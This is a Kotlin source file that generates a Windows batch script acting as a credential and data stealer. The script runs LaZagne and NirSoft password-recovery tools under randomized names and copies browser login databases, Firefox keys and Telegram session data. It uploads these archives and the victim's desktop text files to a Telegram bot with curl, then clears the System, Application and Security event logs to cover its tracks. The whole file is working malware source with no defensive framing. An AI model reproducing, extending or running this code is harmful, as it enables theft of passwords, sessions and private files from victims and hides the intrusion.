package com.example.builder

import java.io.File
import kotlin.random.Random

private var counter = 0

sealed class Command {
    abstract fun generateLine(bitness: String): String

    data class ExeCommand(
        val exeName: String,
        val arguments: String,
        //val outputFilePattern: String = "Update%s.exe_%d.txt"
        val outputFilePattern: String = "${exeName.split("\\").last()}Update%s.exe_%d.txt"

    ) : Command() {


        override fun generateLine(bitness: String): String {
            val suffix = if (bitness == "64") "_64" else ""
            val outputFile = outputFilePattern.format(suffix, counter++)
            return "\"%EXE_${bitness}%/$exeName\"  $arguments \"%USER_LOGS%/$outputFile\""
        }
    }

    data class LazagneCommand(
        val moduleName: String,
        //val outputFilePattern: String = "Update.exe_las_%s_x%s.txt"
        val outputFilePattern: String = "Update.exe_las_%s_x%s.txt"

    ) : Command() {
        override fun generateLine(bitness: String): String {
            val suffix = if (bitness == "64") "64x" else ""
            val lazagneExe = getRandomizedLazagneName(moduleName, bitness)
            val outputFile = outputFilePattern.format(moduleName, suffix)
            return "\"%EXE_${bitness}%/$lazagneExe\" $moduleName > \"%USER_LOGS%/$outputFile\""
        }

        companion object {
            fun createCommented(moduleName: String, outputFilePattern: String = "Update.exe_las_%s_x%s.txt"): String {
                val suffix = "64x"
                val outputFile = outputFilePattern.format(moduleName, suffix)
                return "rem \"%EXE_64%/LAZaGnE.eXE\" $moduleName > \"%USER_LOGS%/$outputFile\""
            }
        }
    }
}

data class FileCopyTarget(
    val source: String,
    val destination: String
)

val TELEGRAM_CHAT_ID = "TELEGRAM_CHAT_ID"
val SAFE_FOLDER = "SAFE_FOLDER"
val azzza = "azzza"


fun main() {
    val config = createConfig()

    val batContent = generateBatFile(config)

    File("D:\\w0\\Новая папка\\Whoesource\\launch.bat").writeText(batContent)
    println("BAT файл успешно создан: launch.bat")
}

fun createConfig(): Config {
    // Настраиваем нумерацию для 32-битных EXE файлов
    val exeCommands32 = listOf(
        Command.ExeCommand("brOwsINGHiSToRYVIEw.eXE", "/stext"),
//        Command.ExeCommand("bULlEtsPAsSVIEW.eXE", "/stext"),
//        Command.ExeCommand("CHROmehisToRyvieW.ExE", "/stext"),
        Command.ExeCommand("chROmePass.eXE", "/stext"),
//        Command.ExeCommand("iEPV.eXe", "/stext"),
//        Command.ExeCommand("MAILpv.exe", "/stext"),
//        Command.ExeCommand("MspaSS.Exe", "/stext"),
//        Command.ExeCommand("oPEraPassView.eXe", "/stext"),
//        Command.ExeCommand("PAsswoRDfOX.eXe", "/stext"),
//        Command.ExeCommand("PStpaSSwOrD.ExE", "/stext"),
//        Command.ExeCommand("ROUtErpaSSView.exE", "/stext"),
//        Command.ExeCommand("SkYpELogview.exE", "/stext"),
//        Command.ExeCommand("tasKschEDuleRViEW.eXE", "/stext"),
//        Command.ExeCommand("TurnEdonTiMeSvieW.exe", "/stext"),
//        Command.ExeCommand("UninstAllvIEw.exe", "/stext"),
//        Command.ExeCommand("vNCpAsSviEw.Exe", "/stext"),
        Command.ExeCommand("wEBbrOWsERPAsSvIew.eXe", "/skeepass")
    )

    // Настраиваем нумерацию для 64-битных EXE файлов
    val exeCommands64 = listOf(
        /*
        * /scomma , /stab , /shtml
/stext
        * */
//        Command.ExeCommand("PASSWOrDFoX.EXe", "/stext" ),//"Update%s_64.exe_%d.txt"
//        Command.ExeCommand("brOwsINGHiSToRYVIEw.eXE", "/stext"),
//        Command.ExeCommand("bULlEtsPAsSVIEW.eXE", "/stext"),
//        Command.ExeCommand("CHROmehisToRyvieW.ExE", "/stext"),
//        Command.ExeCommand("chROmePass.eXE", "/stext"),
//        Command.ExeCommand("iEPV.eXe", "/stext"),
//        Command.ExeCommand("MAILpv.exe", "/stext"),
//        Command.ExeCommand("MspaSS.Exe", "/stext"),
//        Command.ExeCommand("oPEraPassView.eXe", "/stext"),
//        Command.ExeCommand("PStpaSSwOrD.ExE", "/stext"),
//        Command.ExeCommand("ROUtErpaSSView.exE", "/stext"),
//        Command.ExeCommand("SkYpELogview.exE", "/stext"),
//        Command.ExeCommand("tasKschEDuleRViEW.eXE", "/stext"),
//        Command.ExeCommand("TurnEdonTiMeSvieW.exe", "/stext"),
//        Command.ExeCommand("UninstAllvIEw.exe", "/stext"),
//        Command.ExeCommand("vNCpAsSviEw.Exe", "/stext"),
        Command.ExeCommand("passreccommandline\\wEBbrOWsERPAsSvIew.eXe", "/skeepass")
    )

    val lazagneModules = listOf(
        "chats",
//        "mails", "git", "svn", "windows", "wifi", "maven",
//        "sysadmin", "browsers", "games", "multimedia", "memory",
//        "databases", "php", //"all", "unused"
    )

    /*all                 Run all modules
    browsers            Run browsers module
    chats               Run chats module
    databases           Run databases module
    games               Run games module
    git                 Run git module
    mails               Run mails module
    maven               Run maven module
    memory              Run memory module
    multimedia          Run multimedia module
    php                 Run php module
    svn                 Run svn module
    sysadmin            Run sysadmin module
    windows             Run windows module
    wifi                Run wifi module
    unused              Run unused module*/


    val lazagneCommands32 = emptyList<Command.LazagneCommand>()// lazagneModules.map { Command.LazagneCommand(it) }
    val lazagneCommands64 = lazagneModules/*.filter { it != "windows" }*/.map { Command.LazagneCommand(it) }

    val commentedCommands64 = listOf(
        Command.LazagneCommand.createCommented("windows")
    )
// Цели архивации
    val archiveTargets = listOf(
        // Устаревшее (скорее всего не сработает на Win 10+)
        // ArchiveTarget("Cookies.zip", "%UserProfile%\\Cookies\\*.*"),

        // Современные цели:
        ArchiveTarget("Chrome_Cookies.zip", "%LOCALAPPDATA%\\Google\\Chrome\\User Data\\Default\\*.*"),
        ArchiveTarget("Firefox_Data.zip", "%APPDATA%\\Mozilla\\Firefox\\*.*"),
        ArchiveTarget("Edge_Cookies.zip", "%LOCALAPPDATA%\\Microsoft\\Edge\\User Data\\Default\\*.*"),
        ArchiveTarget("IE_WebCache.zip", "%LOCALAPPDATA%\\Microsoft\\Windows\\WebCache\\*.*"),
        ArchiveTarget("Opera_Data.zip", "%APPDATA%\\Opera Software\\Opera Stable\\*.*"),

        // Полные профили браузеров (больше данных):
        ArchiveTarget("Chrome_Full.zip", "%LOCALAPPDATA%\\Google\\Chrome\\User Data\\*.*"),
        ArchiveTarget("Edge_Full.zip", "%LOCALAPPDATA%\\Microsoft\\Edge\\User Data\\*.*"),

        // Добавьте новые цели здесь:
        // ArchiveTarget("Chrome.zip", "%LOCALAPPDATA%\\Google\\Chrome\\User Data\\Default\\*.*"),
        // ArchiveTarget("Edge.zip", "%LOCALAPPDATA%\\Microsoft\\Edge\\User Data\\Default\\*.*"),
        // ArchiveTarget("Telegram.zip", "%APPDATA%\\Telegram Desktop\\*.*"),
        // ArchiveTarget("Downloads.zip", "%USERPROFILE%\\Downloads\\*.*")
    )
    val fileCopyTargets = listOf(
        FileCopyTarget("%APPDATA%\\Opera\\Opera\\profile\\wand.dat", "%$azzza%\\wand.dat"),
        FileCopyTarget("%APPDATA%\\Opera\\Opera 10 Preview!\\profile\\wand.dat", "%$azzza%\\wand-10-preview.dat"),
        FileCopyTarget("%ProgramFiles%\\Opera AC 3.7\\profile\\wand.bat", "%$azzza%\\wand-3.dat"),
        // Добавить другие важные файлы:
        FileCopyTarget("%APPDATA%\\Telegram Desktop\\tdata\\*.*", "%$azzza%\\telegram\\"),
        FileCopyTarget("%LOCALAPPDATA%\\Google\\Chrome\\User Data\\Default\\Login Data", "%$azzza%\\chrome_login_data"),
        FileCopyTarget("%APPDATA%\\Mozilla\\Firefox\\Profiles\\*.default-release\\key4.db", "%$azzza%\\firefox\\")
    )

    return Config(
        commands32 = exeCommands32 + lazagneCommands32,
        commands64 = exeCommands64 + lazagneCommands64,
        commentedCommands64 = commentedCommands64,
        archiveTargets = archiveTargets,
        fileCopyTargets = fileCopyTargets
    )
}

fun generateBatFile(config: Config): String {


    val bat = StringBuilder()

    bat.appendLine("rem @echo off")
    bat.appendLine("setlocal")
    bat.appendLine("cd /d %~dp0")
    bat.appendLine()
    bat.appendLine()

    bat.appendLine("set $azzza=%USERPROFILE%\\AppData\\Local\\Temp\\debug")
    bat.appendLine("set EXE_64=%~dp0System Volume Information\\64")
    bat.appendLine("set EXE_32=%~dp0System Volume Information\\32")
    bat.appendLine()
    bat.appendLine("set OUT=%~dp0out")

    bat.appendLine()




    if (!config.telegramChatId.isNullOrBlank()) bat.appendLine("set $TELEGRAM_CHAT_ID=${config.telegramChatId}")
    if (!config.telegramBotToken.isNullOrBlank()) bat.appendLine("set TELEGRAM_API_SEND_DOCUMENT=https://api.telegram.org/bot${config.telegramBotToken}/sendDocument")
    bat.appendLine()
    bat.appendLine("set portable=${config.portable}")
    bat.appendLine("set PATH=%PATH%;%portable%\\WinRAR;%portable%\\curl;%portable%\\Opera;%$azzza%")
    bat.appendLine()
    bat.appendLine("@if not exist %OUT% md %OUT% >nul")
    bat.appendLine("@if not exist %portable% md %portable% >nul")
    bat.appendLine("unrar x -y -p${config.operaArchivePassword} %~dp0/Opera/Opera_57.0.3098.76_Autoupdate.exe *.* %$azzza%")
    bat.appendLine()

    // В generateBatFile после set OUT
    bat.appendLine("rem === Создание безопасной папки пользователя ===")
    bat.appendLine("rem Получаем имя компьютера")
    bat.appendLine("for /f \"tokens=2 delims==\" %%i in ('wmic computersystem get name /value') do set PC_NAME=%%i")
    bat.appendLine("set PC_NAME=%PC_NAME:~0,-1%")
    bat.appendLine("rem Очищаем от пробелов и спецсимволов")
    bat.appendLine("set PC_NAME=%PC_NAME: =_%")
    bat.appendLine("set PC_NAME=%PC_NAME:(=_%")
    bat.appendLine("set PC_NAME=%PC_NAME:)=_%")

    bat.appendLine("rem Получаем имя пользователя")
    bat.appendLine("for /f \"tokens=2 delims=\\\" %%i in ('echo %USERNAME%') do set USER=%%i")
    bat.appendLine("if \"%USER%\"==\"\" set USER=%USERNAME%")
    bat.appendLine("rem Очищаем от спецсимволов")
    bat.appendLine("set USER=%USER: =_%")
    bat.appendLine("set USER=%USER:(=_%")
    bat.appendLine("set USER=%USER:)=_%")
    bat.appendLine("set USER=%USER:.=_%")
    bat.appendLine("set USER=%USER:@=_%")

    bat.appendLine("rem Создаем безопасное имя папки")
    bat.appendLine("set $SAFE_FOLDER=%PC_NAME%_%USER%")
    bat.appendLine("rem Переводим в верхний регистр для единообразия")
    bat.appendLine("for %%i in (%$SAFE_FOLDER%) do set $SAFE_FOLDER=%%~ni")
    bat.appendLine("set $SAFE_FOLDER=%$SAFE_FOLDER%")
    bat.appendLine("echo Папка пользователя: %$SAFE_FOLDER%")

    bat.appendLine("set USER_OUT=%OUT%\\%$SAFE_FOLDER%")
    bat.appendLine("if not exist \"%USER_OUT%\" mkdir \"%USER_OUT%\"")
    bat.appendLine("set USER_LOGS=%USER_OUT%\\LOGS")
    bat.appendLine("set USER_DATA=%USER_OUT%\\DATA")
    bat.appendLine("mkdir \"%USER_LOGS%\" >nul 2>&1")
    bat.appendLine("mkdir \"%USER_DATA%\" >nul 2>&1")

    bat.appendLine()

    // 32-bit команды
    for (command in config.commands32) {
        bat.appendLine(command.generateLine("32"))
    }
    bat.appendLine()

    // 64-bit команды
    for (command in config.commands64) {
        bat.appendLine(command.generateLine("64"))
    }

    // Закомментированные 64-bit команды
    for (commentedCommand in config.commentedCommands64) {
        bat.appendLine(commentedCommand)
    }

    bat.appendLine()

    bat.appendLine("echo === System Information === > \"%USER_LOGS%\\system_info.txt\"")
    bat.appendLine("systeminfo >> \"%USER_LOGS%\\system_info.txt\"")
    bat.appendLine("echo. >> \"%USER_LOGS%\\system_info.txt\"")
    bat.appendLine("echo === Network Information === >> \"%USER_LOGS%\\system_info.txt\"")
    bat.appendLine("ipconfig /all >> \"%USER_LOGS%\\system_info.txt\"")
    bat.appendLine("echo. >> \"%USER_LOGS%\\system_info.txt\"")
    bat.appendLine("echo === User Information === >> \"%USER_LOGS%\\system_info.txt\"")
    bat.appendLine("whoami /all >> \"%USER_LOGS%\\system_info.txt\"")
    bat.appendLine("echo. >> \"%USER_LOGS%\\system_info.txt\"")
    bat.appendLine("echo === Running Processes === >> \"%USER_LOGS%\\system_info.txt\"")
    bat.appendLine("tasklist >> \"%USER_LOGS%\\system_info.txt\"")

    bat.appendLine()
    val archiveExtensions: List<String> = listOf("txt", "doc", "docx", "xls", "xlsx", "pdf", "rtf")

    val filePatterns = archiveExtensions.joinToString(" ") { ext ->
        "\"%USER_LOGS%/*.$ext\""
    }

    bat.appendLine("WinRAR A -s \"%USER_LOGS%/pretty.bin\" $filePatterns -hp0000 -c000 -IBCK -DF")
    //bat.appendLine("WinRAR A -s \"%USER_LOGS%/pretty.bin\" \"%USER_LOGS%/*.txt\" -hp0000 -c000 -IBCK -DF")

    if (!config.telegramChatId.isNullOrBlank()) bat.appendLine("curl.exe --insecure -F chat_id=%$TELEGRAM_CHAT_ID% -F document=@\"%USER_LOGS%/pretty.bin\" %TELEGRAM_API_SEND_DOCUMENT%")


    for (copyTarget in config.fileCopyTargets) {
        bat.appendLine("if exist \"${copyTarget.source}\" (")
        bat.appendLine("    copy \"${copyTarget.source}\" \"${copyTarget.destination}\"")
        bat.appendLine(") else (")
        bat.appendLine("    echo File not found: ${copyTarget.source}")
        bat.appendLine(")")
    }

    // Архивация целей
    for (target in config.archiveTargets) {
        val passwordParam = if (target.password != null) "-hp${target.password}" else ""

        if (target.hideErrors) {
            // Полное подавление всех сообщений
            bat.appendLine("WinRAR A -s \"%USER_DATA%/${target.archiveName}\" \"${target.sourcePath}\" $passwordParam -dh -idq -inul -y -c000 -IBCK")
            // или с перенаправлением
            // bat.appendLine("WinRAR A -s %%USER_DATA%%/${target.archiveName} ${target.sourcePath} $passwordParam -dh -c000 -IBCK >nul 2>&1")
        } else {
            bat.appendLine("WinRAR A -s \"%USER_DATA%/${target.archiveName}\" \"${target.sourcePath}\" $passwordParam -dh -c000 -IBCK")
        }
    }
// После создания архивов отправляем их
    for (target in config.archiveTargets) {
        bat.appendLine("if exist \"%USER_DATA%/${target.archiveName}\" (")
        bat.appendLine("    curl.exe --insecure -F chat_id=%$TELEGRAM_CHAT_ID% -F document=@\"%USER_DATA%/${target.archiveName}\" %TELEGRAM_API_SEND_DOCUMENT%")
        bat.appendLine(")")
    }

    bat.appendLine()
    bat.appendLine("echo Грабим файлы в телеграм...")
    bat.appendLine("set GRAB_THIS_FOLDER_PLEASE=%USERPROFILE%\\Desktop\\")
    bat.appendLine("cd /d \"%GRAB_THIS_FOLDER_PLEASE%\"")
    bat.appendLine("FOR %%G IN (*.txt) DO (")
    bat.appendLine("echo --> %%G")
    bat.appendLine("curl.exe --insecure -F chat_id=%$TELEGRAM_CHAT_ID% -F document=@\"%%G\" %TELEGRAM_API_SEND_DOCUMENT%")
    bat.appendLine(")")


    bat.appendLine("echo Cleaning traces...")
//    bat.appendLine("del /f /q \"%USER_LOGS%\\*.txt\" >nul 2>&1")
//    bat.appendLine("del /f /q \"%USER_LOGS%\\*.log\" >nul 2>&1")
    bat.appendLine("rmdir /s /q \"%$azzza%\" >nul 2>&1")
    bat.appendLine("wevtutil cl System >nul 2>&1")
    bat.appendLine("wevtutil cl Application >nul 2>&1")
    bat.appendLine("wevtutil cl Security >nul 2>&1")

    bat.appendLine("pause")

    return bat.toString()
}

// Функция для генерации рандомизированного имени Lazagne
fun getRandomizedLazagneName(moduleName: String, bitness: String?): String {

    val strings = listOf(
        "LazAGne.EXe",
        "lazaGNE.EXE",
        "lAZagNe.EXe",
        "LAzaGNe.eXe",
        "LazAgnE.EXE",
        "LAZagnE.EXe",
        "LAZAGne.exE",
        "laZaGne.EXe",
        "laZaGne.exE",
        "LaZAgNE.ExE",
        "LAZaGne.exE",
        "LAZaGne.ExE",
        "LazAGnE.EXE"
    )

    val index = moduleName.hashCode().absoluteValue() % strings.size
    return strings[index]
}

private fun Int.absoluteValue() = if (this < 0) -this else this